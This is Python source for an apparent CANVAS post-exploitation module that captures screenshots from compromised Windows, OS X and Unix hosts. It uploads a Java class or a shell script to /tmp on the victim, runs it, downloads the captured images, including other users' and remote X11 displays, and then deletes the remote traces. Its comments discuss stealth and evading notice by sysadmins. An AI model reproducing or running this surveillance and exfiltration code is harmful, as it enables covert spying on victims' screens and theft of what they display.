#! /usr/bin/env python

#we need to display a nice little mini icon of the screen in the CANVAS gui! (kinda
#like VMware does...) PyGTK has support for raw data like this, if we want to use
#their routines

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from libs.xwdToBmp import xwdToBmp
import os, shutil
import random
import datetime
import canvasengine

from exploitutils import *
from internal import *
from libs.bmp import *
from random import randrange
from canvaserror import *
from ExploitTypes.localcommand import LocalCommand

NAME                   = "screengrab"
DESCRIPTION            = "Grab a picture of the screen"
DOCUMENTATION          = {}
DOCUMENTATION["Notes"] = """
For all selected nodes will take a screenshot of that node. On Windows, it takes a snapshot of the current winstation only. On OSX it will use JAVA to take a snapshot of all desktops/displays. On Unix systems, it will attempt to enumerate all X11 displays, and take screenshots of them, optionally including remote displays being used by clients from the target system. Note that displays which are accessible via both unix and TCP sockets will result in two screenshots of the same system. On some X11 systems (e.g. Solaris), taking a screenshot causes the system to beep. Twitchy sysadmins might notice. If ImageMagick is installed on the Canvas host, screenshots will be available as .bmp files. Otherwise, they will be in .xwd format, which is readable in most graphics programs, but not by CANVAS's Screenshot viewer.
Using All Users and TCP Xservers options together can take a long time on a box that is used for X a lot (worst case: number-of-users * number-of-x-servers-ever * 3-second-timeout)

For commandline use:
MOSDEF\Win32> runmodule screengrab
"""

VERSION                = "1.0"
PROPERTY               = {}
PROPERTY['TYPE']       = "Commands"
PROPERTY['SITE']       = "Local"
PROPERTY['ARCH']       = [ ["Unix"], ["Windows"] ]

from engine.config import canvas_root_directory
X11SCREENSHOT=os.path.join(canvas_root_directory, "Resources", "x11screengrab.sh")

import tarfile

def extractTar(tf, destpath):
    """Extracts all members of a tarfile. .extractall() was added in 2.5, we have to support 2.4"""
    if isinstance(tf, tarfile.TarFile):
        if hasattr(tf, "extractall"):
            tf.extractall(destpath)
        else:
            for f in tf.getmembers():
                if f.isdir():
                    print "Mkdiring: %s" % f.name
                    os.mkdirs(os.path.join(destpath, f.name), 0700)
                else:
                    print "Extracting %s/%s" % (destpath, f.name)
                    tf.extract(f, destpath)
    else:
        raise TypeError("Please to be passing in a TarFile instance")

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result   = []
        self.name     = NAME
        self.filename = None
        self.vert     = None
        self.hor      = None

    # set progress bar
    def set_progr(self, msg, percent):
        self.setInfo("screengrab - "+msg)
        self.setProgress(percent)

    def random_string(self, chars=5):
        """
        Return a string that contains CHARS number of random alphabetic
        characters.
        """
        ret = ''
        for _ in range(chars): ret += chr(randrange(97, 122)) # a-z
        return ret

    def run(self):
        rv = 0
        self.host = self.target.interface
        self.setInfo("%s (in progress)"%(NAME))
        screenshotCount = 0

        for node in self.argsDict["passednodes"]:
            type = node.nodetype
            if "win32api" in node.capabilities:
                dirname=self.output(ip=node.get_interesting_interface(), subdir="ScreenShots")
                #I'm assuming this opens the file read-write
                #on windows you need to have writable access
                #Lesson Learned: don't use os.tmpfile() for anything portable.
                #tempoutfile=os.tmpfile()
                tmpfilename="tmp%d.raw"%random.randint(0,50000)
                devlog("bmp", "tmpfilename=%s"%tmpfilename)
                tempoutfile=file(tmpfilename,"wb")
                hor,vert,data=node.shell.screengrab(fileobj=tempoutfile, progr=self.set_progr)
                tempoutfile.close() #go back to beginning
                tempoutfile=file(tmpfilename,"rb")
                ran=random.randint(1,2000)
                #filename="screengrab-%s.raw"%ran
                #fullfilename=os.path.join(canvas_root_directory,dirname,filename)
                #rgbfile=file(fullfilename, "wrb")
                bmpdata="" #set to null because we write into this file later
                filebmp ="screengrab-%s.bmp"%ran
                devlog("bmp", "filebmp = %s"%filebmp)
                #fullbmp=os.path.join(canvas_root_directory,dirname,filebmp)
                fullbmp=os.path.join(dirname,filebmp)
                try:
                    fout = file(fullbmp, "wb")
                    b = BMP()
                    fout.write( b.getBMPfromraw(hor, vert, bmpdata) )
                    devlog("bmp", "Calling normalize: %s:%s"%(hor,vert))
                    normalize_no_change(hor, vert, tempoutfile, fout)
                    #normalizergb_file(hor, vert, tempoutfile, fout)
                    fout.close()

                    self.addScreenshot(node, fullbmp, vert, hor, data=b)
                    screenshotCount+=1
                    rv = 1
                    msg = "success %d screen(s) shot" % screenshotCount
                except IOError, err:
                    ##Likely a permission error
                    self.log("Unable to write to: '%s' - %s"%(fullbmp, err))
                    rv  = 0
                    msg = "failed screenshot"

                tempoutfile.close() #close this to flush it
                os.unlink(tmpfilename) #remove our temporary file

                #now our rgbfile has the correct data in it
                #and is a BMP

            elif "osx" in node.capabilities:
                # There are a couple of ways to grab a screenshot on OSX
                # One could use osascript to execute applescript which can then
                # control Preview.app and other apps that can take screenshots
                #
                # The easiest and most stealthy way is through the command line,
                # by executing /usr/sbin/screencapture but as the manpage says
                # it must be executed in the same mach bootstrap hierarchy as loginwindow
                # which depending on the vulnerable app that gave us access may not
                # be the case. If one has root, this will work by calling
                # sudo launchctl bsexec $PID screencapture.
                # The screencapture method is commented out below.
                #
                # The other way that requires no mach hierarchies trickery is to upload
                # a java class and execute it. All OSX versions so far come with java
                # pre-installed and this should work well. It not as stealthy as
                # screencapture (there is an app switch on the global menu bar for 1-2 seconds
                # but should work no matter the level of access. (Doesn't work when OSX runs
                # inside a VM due to the software rendering but then again neither does screencapture)
                #

                dirname = self.output(ip=node.get_interesting_interface(), subdir="ScreenShots")
                filename = '/tmp/.%s-%s' % (self.random_string(5),
                                            self.random_string(4))
                self.setProgress(20)
                # self.log('Executing screencapture with filename %s' % filename)
                # node.runcommand('/usr/sbin/screencapture -x -m -t bmp -T 0 %s' % filename)

                try:
                    self.log('Uploading java class file..')
                    node.upload(os.path.join(canvas_root_directory, "Resources", "snap.class"),
                                "/tmp/")
                    self.setProgress(40)

                    self.log('Executing snap.class with filename %s' % filename)
                    node.runcommand('/usr/bin/java -cp /tmp/ snap %s' % filename)
                    self.setProgress(50)

                    self.log('Downloading %s into %s' % (filename, dirname))
                    node.download(filename, dirname)
                    self.setProgress(70)

                    self.log('Cleaning up..')
                    node.runcommand('rm -rf %s' % filename)
                    node.runcommand('rm -rf /tmp/snap.class')
                    self.setProgress(80)

                    filename = filename.replace('/', '_')
                    filename = os.path.join(dirname, filename)
                    t = datetime.datetime.now()
                    newfilename = 'screengrab_%s.bmp' % t.strftime("%m%d%Y%H%M%S")
                    self.log('Renaming %s into %s' % (filename, newfilename))
                    shutil.move(filename, os.path.join(dirname, newfilename))
                    self.setProgress(90)

                    f = open(os.path.join(dirname, newfilename), 'rb')
                    # Enough for DIB header that contains width, height
                    bmpheader = f.read(26)
                    f.close()

                    width     = abs(struct.unpack('<i', bmpheader[0x12:0x16])[0])
                    height    = abs(struct.unpack('<i', bmpheader[0x16:0x1a])[0])
                    self.log('Width: %d Height: %d' % (width, height))

                    self.log("Adding screenshot")
                    self.addScreenshot(node, os.path.join(dirname, newfilename), width, height)
                    msg = "success!"
                    rv = 1
                except Exception, ex:
                    self.log('Error: %s' % ex)
                    msg = "Error"
                    rv = 0
            elif "Unix Shell" in node.capabilities:
                destpath="/tmp" # TODO: somewhere more sensible?
                dirname=self.output(ip=node.get_interesting_interface(), subdir="ScreenShots") #local path to drop shots to
                # upload shellscript which does the screenshotting
                try:
                    node.upload(X11SCREENSHOT, destpath, destpath+"/x.sh")


                    self.setProgress(20)
                    args = []
                    if self.argsDict.get("tcpxservers") == False:
                        args.append("-t")
                    if self.argsDict.get("environment") == False:
                        args.append("-e")
                    if self.argsDict.get("allusers") == False:
                        args.append("-a")

                    output = node.runcommand("/bin/sh " + destpath +"/x.sh" +" " + " ".join(args))
                    self.setProgress(40)
                    self.log("X11 Screenshot: " + output)

                    if output.find("No screenshots were successfully acquired") != -1:
                        raise ValueError("Remote end was unable to acquire any screenshots")

                    # Read output of script, spot it finishing, grab it's file.
                    l = output[output.index("File ready for transit: "):].split("\n")[0]
                    fn = l[l.index(":")+1:].strip()
                    lfn = "canvasXWD-tmp-%d" % random.randint(0,50000)
                    lfnDir = "%s-unpack.tar" % lfn
                    self.log("Attempting download of %s" % fn)
                    df = node.download(fn, lfn)
                    lfn = df.split(" ")[-1]
                    self.log("Saved screenshots into %s" % lfn)

                    self.setProgress(60)
                    # Clean up remote end
                    l = output[output.index("Remember to vape:"):].split("\n")[0]
                    fn = l[l.index(":"):].strip()
                    self.log("Cleaning up remote end")
                    node.runcommand("rm -rf %s %s/%s" % (fn, destpath,"x.sh"))
                    self.setProgress(80)
                    self.log("Unpacking and processing %s" % lfn)
                    # Unpack tarball
                    os.mkdir(lfnDir)
                    import tarfile
                    tf = tarfile.open(lfn, "r:gz")
                    extractTar(tf, lfnDir)
                    tf.close()
                    # Move into screenshot directory
                    w = 0
                    h = 0
                    import glob
                    prefix = "screengrab-%d-" % random.randint(1,2000)
                    for f in glob.glob(os.path.join(lfnDir, "dpy-*.xwd")):
                        imerror = None
                        try:
                            dest = ".".join(os.path.split(f)[-1].split(".")[:-1]) + ".bmp"
                            dest = os.path.join(dirname, prefix+dest)
                            xwdToBmp(f, dest)
                        except Exception, e:
                            self.log("CANVAS was unable to convert xwd file. %r" % e)
                            imerror = True

                        if imerror:
                            # xwdToBmp didn't work. Try with image magick.
                            imerror = None
                            try:
                                import subprocess
                                dest = ".".join(os.path.split(f)[-1].split(".")[:-1]) + ".bmp"
                                #dest = os.path.join(canvas_root_directory,dirname, prefix+dest)
                                dest = os.path.join(dirname, prefix+dest)
                                self.log("Calling ImageMagick convert '%s' '%s'" % (f, dest))
                                # May as well call identify to get res while we're here huh
                                # I'm sure it can go into libs/bmp.py when someone writes
                                # an xwd -> bmp erator too.
                                convert = subprocess.Popen(["convert", f, dest])
                                if convert.wait() == 0:
                                    ident = subprocess.Popen(["identify", dest], stdout=subprocess.PIPE)
                                    if ident.wait() == 0:
                                        info = ident.stdout.read()
                                        w,h = info.split(" ")[2].split("x")
                                        h = int(h)
                                        w = int(w)
                                    else:
                                        imerror = "identify failed to read converted bmp"
                                else:
                                    imerror = "convert failed"
                            except OSError, info:
                                imerror = "Failed to popen: %s" % info

                            except ImportError, info:
                                imerror = "failed to import subprocess: %s" % info

                            if imerror != None:
                                self.log("CANVAS was unable to convert xwd file, and ImageMagick is not available, your screenshots will stay in xwd format (%s)" % imerror)
                                #dest = os.path.join(canvas_root_directory,dirname, prefix+os.path.split(f)[-1])
                                dest = os.path.join(dirname, prefix+os.path.split(f)[-1])
                                shutil.move(f,dest)

                        self.log("Adding screenshot %s as %s" % (f, dest))
                        screenshotCount += 1
                        self.addScreenshot(node, dest, w, h)

                        rv = 1
                    msg = "success %d screen(s) shot" % screenshotCount

                    # TODO: Stash the xauth files somewhere too?

                    #Clean up
                    self.log("Cleaning up local end")
                    for root, dirs, files in os.walk(lfnDir, topdown=False):
                        for name in files:
                            os.remove(os.path.join(root, name))
                        for name in dirs:
                            os.rmdir(os.path.join(root, name))
                    os.rmdir(lfnDir)
                    os.unlink(lfn)
                    self.setProgress(100)


                except (ValueError, NodeCommandError), info:
                    self.log("X11 screengrab on %s didn't work: %s" % (node.get_interesting_interface(), info))
                    self.setProgress(-1)
                    rv = 0
                    msg = "failed"

            else:
                self.log("Node of type %s not supported yet."%type)
                rv = 0
                msg = "unsupported"

        self.setInfo("%s - done (%s)"%(NAME, msg))
        return rv

    def addScreenshot(self, node, filename, height, width, data=None):
        """Adds a screenshot to the Gui's screenshot store"""
        self.log("Check \"My Screenshots\" icon to see the screenshot")

        self.new_event("screenshot", {
            "filename"  : filename,
            "data"      : data,
            "node"      : node.getname(),
            })

        localhost=node.get_known_host("127.0.0.1") #get local host
        localhost.add_knowledge("Screengrab",":".join(["%s"%height,"%s"%width,filename]),100)
        filename = ".".join(filename.split(".")[:-1]) + ".conf"
        fout=file(filename, "wb")

        # TODO: Fix this to use exploits/computername, cause node.shell is not right way
        computername= ""
        try:
            computername= node.shell.getComputerName()
        except AttributeError:
            pass

        host=node.get_interesting_interface()

        fout.write("%d:%d:%s [%s]" % (height, width, computername, host))
        fout.close()

        self.result+=[(width, height, filename)]

if __name__=="__main__":
    print "You can't run this from the commandline, sorry"
